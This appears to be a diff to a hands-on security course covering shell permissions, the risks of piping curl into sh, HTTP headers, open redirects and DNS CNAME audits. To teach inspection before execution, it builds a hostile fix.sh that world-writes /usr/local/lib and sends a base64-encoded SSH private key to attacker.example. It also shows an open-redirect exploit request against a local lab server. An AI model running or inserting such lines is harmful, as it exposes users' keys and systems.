@@ -2539,14 +2539,16 @@ The only thing that changed is the second and third permission groups: \`r--r--\
 
 **Goal.** For each command below, decide **read-only** or **state-changing** — *before* running it. Then run only the ones you judged read-only and confirm they changed nothing.
 
-\`\`\`bash
-ls -la              # ?
-cat /etc/hostname   # ?
-rm -rf ./build      # ?
-chmod 777 app.js    # ?
-curl -s example.com # ?
+\`\`\`text
+ls -la               # ?
+cat /etc/hostname    # ?
+rm -rf ./build       # ?
+chmod 777 app.js     # ?
+curl -s example.com  # ?
 mv notes.txt old.txt # ?
 \`\`\`
+
+(Deliberately **not** a runnable block — it is a list to classify. Half of it would change state, and running the block wholesale is the exact reflex this drill is training you out of.)
 
 **Done when.** You can say, for each, which kind it is and *why* — and you did not run the three that change state.
 
@@ -2572,10 +2574,17 @@ The habit that matters: **the classification is a property of the verb, learnabl
 \`\`\`bash
 mkdir -p ~/term-workbench && cd ~/term-workbench
 printf 'DB_PASSWORD=not-a-real-password\\n' > .env
-ls -l .env          # often -rw-r--r-- : group and others can READ your secret
+ls -l .env
 chmod 600 .env
-ls -l .env          # -rw------- : owner rw, nobody else anything
+ls -l .env
 \`\`\`
+\`\`\`
+-rw-r--r--@ 1 you  staff  32 Aug  7 16:41 .env
+-rw-------@ 1 you  staff  32 Aug  7 16:41 .env
+\`\`\`
+Owner name, group, date and size will differ; the **first ten characters are the finding**. Before: \`-rw-r--r--\` — group and others can READ your database password. After: \`-rw-------\` — owner read/write, nobody else anything.
+
+Two things learners trip on here. The trailing \`@\` is macOS marking *extended attributes* (the file picked up metadata just by being created); it is not a permission and Linux won't show it. And the "before" line depends on your \`umask\` — \`022\` is the common default and gives \`644\`, but if yours is \`077\` the file is already \`600\` and the first line looks like the second. Run \`umask\` to see which case you're in; the drill still works, you just started already-safe.
 
 **Derive \`600\`, don't memorize it.** Three digits = owner, group, others. Each is read(4)+write(2)+execute(1). Owner \`6\` = 4+2 = read+write; group \`0\` and others \`0\` = nothing. So \`600\` is precisely "only I can touch this." A \`.env\` at the common default \`644\` lets *every user on the machine read your database password* — on a shared host or a container image that's a real exposure, not a theoretical one. This is the same arithmetic Module 0.1 introduced and Phase 8 turns into a formal finding.
 </details>
@@ -2603,13 +2612,43 @@ curl -s https://example.com/fix.sh | sudo sh
 - **No integrity check.** You've verified nothing about *what* you're running — no hash, no signature, no pinned version. A compromised or swapped-out \`fix.sh\` is undetectable this way.
 - **A transient failure can execute a partial script.** A dropped connection mid-download can leave a half-command that does something you never intended.
 
-**The safe rewrite — separate download, inspect, then decide:**
+**The safe rewrite — separate download, inspect, then decide.** Rather than trust a stranger's URL, host a hostile \`fix.sh\` yourself so you can watch the workflow catch it. In one terminal:
+
 \`\`\`bash
-curl -s https://example.com/fix.sh -o fix.sh   # download only, run nothing
-less fix.sh                                     # READ it end to end
-# only if it is genuinely safe and you understand every line:
-sh fix.sh                                        # and add sudo ONLY if a specific step truly needs it
+mkdir -p ~/term-workbench/server && cd ~/term-workbench/server
+cat > fix.sh <<'EOF'
+#!/bin/sh
+echo "Fixing permissions..."
+chmod -R 777 /usr/local/lib
+curl -s "http://attacker.example/collect?d=$(cat ~/.ssh/id_rsa 2>/dev/null | base64)"
+EOF
+python3 -m http.server 8099 --directory . &
 \`\`\`
+\`\`\`
+Serving HTTP on :: port 8099 (http://[::]:8099/) ...
+\`\`\`
+
+Now, in a second terminal, run the safe workflow against it:
+
+\`\`\`bash
+mkdir -p ~/term-workbench/victim && cd ~/term-workbench/victim
+curl -s http://localhost:8099/fix.sh -o fix.sh   # download only, run nothing
+cat fix.sh                                       # READ it end to end (use \`less\` for a long one)
+\`\`\`
+\`\`\`
+#!/bin/sh
+echo "Fixing permissions..."
+chmod -R 777 /usr/local/lib
+curl -s "http://attacker.example/collect?d=$(cat ~/.ssh/id_rsa 2>/dev/null | base64)"
+\`\`\`
+
+There it is, in plain sight, and **you have not executed a single line of it**: it world-writes a system library directory and exfiltrates your SSH private key. Piped into \`sudo sh\`, both would already have happened. Only after reading would you consider \`sh fix.sh\` — and add \`sudo\` only if a specific step genuinely needs it. Here you never get that far. Clean up with \`kill %1\` in the first terminal.
+
+One tempting shortcut is worth naming, because it does *not* substitute for reading:
+\`\`\`bash
+curl -s http://localhost:8099/fix.sh | sh -n    # parse only, execute nothing
+\`\`\`
+**Expected output:** nothing at all. \`sh -n\` checks *syntax* and stays silent when the script parses. Valid shell is not safe shell, and this script is both valid and hostile. There is no automated check that replaces reading it.
 
 The principle generalizes far past this one line: **never let "convenient" mean "unread."** \`curl | sh\` is the developer-facing version of the same trust failure this whole course is about — running input you didn't inspect. You'll see its server-side cousins (unsafe deserialization, injection) throughout Phases 2–3.
 </details>
@@ -4083,9 +4122,15 @@ Two status lines for one command: the redirect, then the destination. **The one-
 
 \`\`\`bash
 curl -i https://example.com | head -5
-# HTTP/2 200            <- status line: version + code
-# content-type: text/html   <- a response header
 \`\`\`
+\`\`\`
+HTTP/2 200
+date: Fri, 07 Aug 2026 15:41:06 GMT
+content-type: text/html
+server: cloudflare
+last-modified: Sat, 01 Aug 2026 09:39:03 GMT
+\`\`\`
+Line 1 is the **status line** — protocol version plus code. Line 3 is the header you were asked for. Your \`date\` and \`last-modified\` will differ, and the header *order* is not guaranteed, so read by name rather than by position. If \`server:\` says something other than \`cloudflare\`, that is fine too — example.com has moved hosts before and will again, which is precisely why you should never memorize an infrastructure detail you can query.
 
 \`-i\` includes the response headers; piping to \`head\` keeps the body from scrolling past. The status line and header block are the two things a security engineer reads *first* on any response — before the body — because they tell you what happened and how the client will interpret what follows.
 
@@ -4107,6 +4152,10 @@ http.createServer((req, res) => {
 EOF
 node echo-server.js     # leave running; use a second terminal for curl
 \`\`\`
+\`\`\`
+echo server on http://localhost:4600
+\`\`\`
+It then sits there with no prompt back — that is correct, a server runs until you stop it. Open a **second terminal** for the \`curl\`. If you instead see \`Error: listen EADDRINUSE\`, an earlier run is still holding 4600: \`lsof -ti:4600 | xargs kill\`.
 
 **Goal.** Send **one** request that simultaneously: uses the \`DELETE\` method, carries a \`Cookie\` header of a value you invented, and carries a made-up custom header \`X-Secret\`. Confirm the server saw all three exactly as you set them.
 
@@ -4126,8 +4175,21 @@ curl -s -X DELETE \\
   -H 'Cookie: session=anything-i-want' \\
   -H 'X-Secret: i-set-this' \\
   http://localhost:4600/
-# ... "method": "DELETE", ... "cookie": "session=anything-i-want", ... "x-secret": "i-set-this"
 \`\`\`
+\`\`\`
+{
+  "method": "DELETE",
+  "path": "/",
+  "headers": {
+    "host": "localhost:4600",
+    "user-agent": "curl/8.7.1",
+    "accept": "*/*",
+    "cookie": "session=anything-i-want",
+    "x-secret": "i-set-this"
+  }
+}
+\`\`\`
+Your \`user-agent\` will show your own curl version. Everything else should match exactly. Note that header names arrive **lower-cased** — Node normalizes them, because HTTP header names are case-insensitive; a server that compares \`req.headers["X-Secret"]\` finds \`undefined\` and silently skips the check it thought it was doing.
 
 \`-X\` chooses the method; each \`-H\` adds one header; \`Cookie\` has no special status — it's a header like any other, which is why "the browser controls the cookie" is false the moment someone uses \`curl\`. This is "the client is attacker-controlled" (Module 0.3) made literal at the protocol level: there is **no part of a request the server receives that the client did not choose.** Every validation decision on the server must start from that fact — which is why the next task is about a server that forgot it.
 </details>
@@ -4153,6 +4215,10 @@ http.createServer((req, res) => {
 EOF
 node redirect-server.js    # second terminal
 \`\`\`
+\`\`\`
+redirect server on http://localhost:4601
+\`\`\`
+(Port 4601, so it runs alongside the echo server from Drill 2. Same \`EADDRINUSE\` fix if needed: \`lsof -ti:4601 | xargs kill\`.)
 
 **Your task:**
 1. Write the request that turns this login endpoint into a redirect to an external site you don't control (imagine \`https://evil.example\` is a phishing lookalike). Confirm the \`302\` and the \`Location\`.
@@ -4173,9 +4239,12 @@ For the exploit: the endpoint hands whatever you put in \`next\` straight into \
 **1. The exploit:**
 \`\`\`bash
 curl -si "http://localhost:4601/login?next=https://evil.example" | grep -iE '^HTTP|^location'
-# HTTP/1.1 302 Found
-# Location: https://evil.example
 \`\`\`
+\`\`\`
+HTTP/1.1 302 Found
+Location: https://evil.example
+\`\`\`
+The \`Location\` header came straight from your query string, unfiltered. (\`-s\` silences the progress meter, \`-i\` includes headers; curl does **not** follow the redirect unless you add \`-L\`, which is what you want here — you're inspecting the redirect, not taking it.)
 The victim clicks a link to \`localhost:4601\` (a site they trust) and lands on \`evil.example\`. The trust in the first domain is *transferred* to the destination — that's the whole scam, and it's why open redirect is a real finding even though "it's just a redirect."
 
 **2. Bypasses of \`startsWith("http://localhost:4601")\`** — each still sends the victim off-site:
@@ -4466,9 +4535,22 @@ The key insight is *who can claim the name on the provider's side* once you've s
 **Outside the box — the cheap routine that catches it:** you don't audit dangling CNAMEs by hand. You script the loop the module's tools already give you:
 \`\`\`bash
 for sub in www shop blog status cdn app; do
-  echo -n "$sub: "; dig +short CNAME "$sub.yoursite.com" || echo "(none)"
+  c=$(dig +short CNAME "$sub.github.com")
+  echo "$sub: \${c:-(none)}"
 done
 \`\`\`
+\`\`\`
+www: github.com.
+shop: github.com.
+blog: github.github.io.
+status: redirect.github.com.
+cdn: (none)
+app: (none)
+\`\`\`
+Swap in your own domain; these answers will change as GitHub changes its DNS. Read the *shape*, not the values: \`blog\` is a CNAME to a **hosted provider** (\`github.github.io\`), which is the takeover-relevant pattern, while \`cdn\` and \`app\` simply have no CNAME.
+
+**A shell trap worth stealing from this snippet.** The obvious way to write the fallback is \`dig +short CNAME "$sub.example.com" || echo "(none)"\` — and it silently never works. \`dig\` exits **0** when it successfully asks a question and the answer is "no such record," so \`||\` never fires and you get a run of bare labels with nothing after them. "The command succeeded" and "the command found something" are different questions; capture the output and test *that* for emptiness (\`\${c:-(none)}\`). The same mistake makes \`grep\`-based checks lie in the opposite direction — grep *does* exit non-zero on no-match, which is exactly what Module 1.3's secret-scanning gate depends on.
+
 Any CNAME pointing at a provider you no longer use is a candidate takeover. This is exactly the "extract a field, loop over inputs" shape from the Phase 0 Workbenches, pointed at DNS — and it generalizes to certificate-expiry monitoring (loop \`openssl … -enddate\` over your hosts) and any other "check the same thing across many targets" audit.
 </details>
 
